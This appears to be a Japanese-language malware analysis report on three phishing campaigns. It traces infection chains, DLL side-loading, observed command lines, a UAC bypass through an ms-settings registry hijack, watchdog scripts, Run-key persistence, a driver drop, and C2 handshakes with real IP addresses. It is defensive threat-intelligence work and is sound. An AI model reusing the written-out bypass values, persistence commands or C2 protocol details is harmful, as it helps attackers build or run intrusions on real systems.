# 感染chain・process・command line詳細

## 1件目: 「【請求書】8月分ご請求書の送付について」

### 配布からside-load

```text
hxxps://dnbwr-rtw4u.pages[.]dev
  -> JD09_109_R01000331_202608.zip
  -> CIT-Number.20260824112143.IMG
  -> "D:\CIT-Number.20260824112143.EXE" または "E:\CIT-Number.20260824112143.EXE"
       -> nW_Elf.dLLをside-load
```

drive letterはsandboxごとにD:／E:へ変わります。正規EXE SHA-256 `4bfa832e…5c1d`はZhejiang Xunmengの有効署名を持つcontext-only fileです。悪性`nW_Elf.dLL`は署名なしです。

### UAC bypassとwatchdog

実観測command lineは次のとおりです。

```text
cmd.exe /c C:\Windows\System32\ComputerDefaults.exe
C:\Windows\System32\ComputerDefaults.exe
"NvDLISR.NVX.exe"
C:\ProgramData\NvDLISR.{A2FF32BA-CCC8-4200-B13C-D442BF642F9B}\nvdlisr.nvi\NvDLISR.NVX.exe
cmd.exe /c start "" /B cmd /C C:\ProgramData\S-1-5-21-3053180483-1881419501-3594244048\S-1-5-21-3053180483-1881419501-3594244048.CMD
cmd /C C:\ProgramData\S-1-5-21-3053180483-1881419501-3594244048\S-1-5-21-3053180483-1881419501-3594244048.CMD
TASKLIST /FI "IMAGENAME eq NvDLISR.NVX.exe" /FO CSV
FIND /I "NvDLISR.NVX.exe"
TIMEOUT /t 60 /nobreak
taskkill /f /im cmd.exe
```

別sandboxではGUIDが`{D169A416-0BCF-4308-B189-C535E144BFC9}`、SID風directoryが`S-1-5-21-3797332335-34111092-3597280141`でした。GUID／SID部分は可変です。

UAC bypass用の実観測値は次のとおりです。`DelegateExecute`は空文字で設定され、起動後に`ms-settings` treeが削除されます。

```text
HKCU\Software\Classes\ms-settings\Shell\open\command\(Default)
  = ../../ProgramData/NvDLISR.{A2FF32BA-CCC8-4200-B13C-D442BF642F9B}/nvdlisr.nvi/NvDLISR.NVX.exe
HKCU\Software\Classes\ms-settings\Shell\open\command\DelegateExecute
  = ""
```

`ComputerDefaults.exe`がこのhandlerを解決して`NvDLISR.NVX.exe`を昇格起動します。CMD fileは60秒ごとにprocess存在を確認するwatchdogです。

### 通信と最終取得内容

```text
NvDLISR.NVX.exe
  -> https://api.ipify.org/  (GET、User-Agent: Mozilla/5.0)
  -> 121.127.253.206:8856  (stage channel)
  -> 121.127.253.206:8868  (control channel)
```

8856/TCPで観測した順序は次のとおりです。

1. client command `0x04`（stage channel control）
2. client command `0x05`（UTF-16 metadata preview `登录模块.dll_bin`）
3. server command `0x04`、module/session ID `d257283e8c97dec6263eb98cbdcb67d3`
4. server command `0x01`、338,962-byte frame
5. frame offset 4,100から334,848-byte x86 PEを復元

8868/TCPではclient `0x06`登録、server `0xCA`登録完了、client `0xCB` acknowledgement、双方向`0xC9` heartbeat／status、client `0x00` drive inventoryを観測しました。取得PCAPの終了まで、serverからremote shell等のoperation commandは観測していません。したがって「最後に確認できたserver command」は`0xC9`のstatus／heartbeatであり、追加の任意command lineはありません。

後段コードはC2入力を`CreateProcessW`へ渡す能力と`svchost.exe` injection能力を持ちますが、これらは静的能力です。今回のPCAPに具体的な攻撃者command lineが含まれていたという意味ではありません。

## 2件目: 「情報更新など」

### 配布・install・process tree

```text
2026082015837462_pdf.zip
  -> 2026082015837462_pdf.img
  -> "C:\Users\Admin\AppData\Local\Temp\2026081829618475_setup.exe"
       -> C:\Users\Admin\AppData\Local\Temp\~tmp_23847.tmp
       -> explorer.exe shell:::{F732A748-74E1-46A8-92B5-3BDF72F04071}
            -> "C:\ProgramData\OpenraVPN\Loader.exe" --summary
                 -> cmd.exe /c "C:\ProgramData\OpenraVPN\Loader.exe --portability"
                      -> C:\ProgramData\OpenraVPN\Loader.exe  --portability
```

別sandboxのCLSIDは`{F63151CE-3529-4187-928A-2292DB65F4EA}`でした。install後のfileは次のとおりです。

```text
C:\ProgramData\OpenraVPN\Loader.exe
C:\ProgramData\OpenraVPN\vulkan-1.dll
```

`Loader.exe`は正規Intel署名hostのcopyです。`vulkan-1.dll`にはFutureWave名義の署名がありますが、chain validationは失敗しており、悪性判定を覆しません。

実観測されたmode付きcommand lineは次のとおりです。

```text
"C:\ProgramData\OpenraVPN\Loader.exe" --summary
"C:\ProgramData\OpenraVPN\Loader.exe"  --summary
cmd.exe /c "C:\ProgramData\OpenraVPN\Loader.exe --portability"
C:\ProgramData\OpenraVPN\Loader.exe  --portability
```

永続化値とCLSID commandは同じ`--summary`起動へ収束します。

```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ServiceController
  = "C:\ProgramData\OpenraVPN\Loader.exe" --summary
HKCU\Software\Classes\CLSID\{F732A748-74E1-46A8-92B5-3BDF72F04071}\Shell\Manage\command\(Default)
  = "C:\ProgramData\OpenraVPN\Loader.exe" --summary
```

TriageのDLL単体taskにある次のcommandは解析harnessによる強制export起動であり、通常感染chainには含めません。

```text
rundll32.exe C:\Users\Admin\AppData\Local\Temp\vulkan-1.dll,#1
```

### 悪性process挙動

- `--summary` modeがinstall／永続化を整え、`cmd.exe`経由で`--portability` modeを起動します。
- `--portability`の`Loader.exe`が449/TCPを所有し、stage取得・登録・status送信を行います。
- `Loader.exe`／`cmd.exe` chain間の`WriteProcessMemory`とthread injectionをsandboxで観測しました。
- 静的には`ip-api.com/json/`による外部IP・地域情報取得、`avp.exe`確認、drive／software列挙、firewall許可rule作成を持ちます。
- 復元stageはprocess creation／injection、screenshot、registry、network remote-control能力を持ちます。

firewall rule名は`RemoteController_Inbound_Rule`と`RemoteController_Outbound_Rule`です。

### 通信と最終取得内容

PCAPで実観測した接続先は`170.62.130.47:449`です。`ca01` modeのframe payloadは固定`0xCC` XORです。

1. client `0x04`
2. client `0x05`、metadata `登录模块.dll_bin`
3. server `0x04`、ID `07e6366faec4844a06489cbfc99f9316`
4. server `0x01`、301,860-byte frame
5. frame offset 4,374から297,472-byte x64 PEを復元
6. client `0x06`登録
7. server `0xCA`登録完了
8. client `0xCB` acknowledgement
9. 双方向`0xC9` heartbeat／status、client `0x00`状態報告

PCAPの終了までserver operation commandはありません。最後に確認できたserver messageは`0xC9` heartbeat／statusです。`170.62.130.47:443`は静的configに含まれますが、この観測では接続されていません。

## 3件目: 「【お見積り・お取引のご相談】新規調達に関するお問い合わせ」

### 3 IMGの通常chain

3つのIMGはいずれも次の同一chainです。

```text
"C:\Users\Admin\AppData\Local\Temp\20260824.exe"
  -> MSOCF.dllをside-load
  -> prj????.tmp
  -> C:\Users\Public\svchostsr.exe
  -> C:\Windows\System32\drivers\kvckiller.sys
  -> "C:\Users\Public\svchostsr.exe"
```

`prj????.tmp`のsuffixはrunごとに変化します。正規hostはMicrosoft署名済みで、54個の`MSOCF.dll` exportのうち12個をimportします。

DLL単体taskの次のcommandはsandbox harnessによるもので、通常chainではありません。誤った`msvcr100.dll,#1`起動に伴う`WerFault.exe`も感染挙動から除外します。

```text
rundll32.exe C:\Users\Admin\AppData\Local\Temp\MSOCF.dll,#1
rundll32.exe C:\Users\Admin\AppData\Local\Temp\msvcr100.dll,#1
```

### 永続化・driver

```text
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Microsoft Office
  = C:\\Users\Public\svchostsr.exe

HKLM\SYSTEM\CurrentControlSet\Services\EmbeddedDriverService\ImagePath
  = \??\C:\Users\Admin\AppData\Local\Temp\EmbeddedDriverService.sys
```

`kvckiller.sys` SHA-256は`ff5dbdcf6d7ae5d97b6f3ef412df0b977ba4a844c45b30ca78c0eeb2653d69a8`、`svchostsr.exe` SHA-256は`ce6bb7eddc83762c708d4a41709ae00371dbdc09b2a380f28fa60b1edf917473`です。sandboxではdriver directoryへのdrop、driver load、`SeLoadDriverPrivilege`／`SeDebugPrivilege`使用を観測しました。

### 通信と最終取得内容

静的configとPCAPの双方で`202.61.140.222:448`を確認しました。初期TCP exchangeは次のとおりです。

```text
client -> server: 39 39 00                  # ASCII "99\0"
server -> client: 14-byte header + XOR 0xCC encrypted stage
```

codeはTCP responseを受信し、先頭14 bytesを除外して残りを`0xCC`でXORし、memory上で呼び出します。PCAP frame 25のpayloadは正確に`393900`です。server responseは複数TCP segmentに分割されています。

この後段が受け取る個別operation commandの意味までは、本PCAPから安全に復号・対応付けできていません。したがって、最後に確実に同定できたserver取得物は「`99\0`要求に対する暗号化stage」であり、攻撃者が送った具体的なshell command lineは確認できません。未確認commandを推測で記載しません。

codeにはUDP fallback／capabilityもあり、requestはASCII `1`とlittle-endian chunk index、responseは100-byte chunkです。しかしcurrent configのflagはTCPを選択しており、今回の実観測chainでは使われていません。
